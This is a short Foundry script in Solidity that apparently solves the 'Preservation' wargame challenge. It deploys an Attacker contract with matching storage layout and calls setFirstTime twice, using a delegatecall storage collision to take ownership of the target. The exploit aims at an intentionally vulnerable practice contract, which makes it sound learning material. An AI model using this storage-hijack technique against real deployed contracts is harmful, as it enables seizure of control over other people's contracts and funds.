// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract SolvePreservation is Script {
    Preservation public preservation;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        preservation = Preservation(
            payable(vm.envAddress("PRESERVATION_ADDRESS"))
        );
        preservation.setFirstTime(uint256(uint160(address(new Attacker()))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
        vm.stopBroadcast();
    }
}
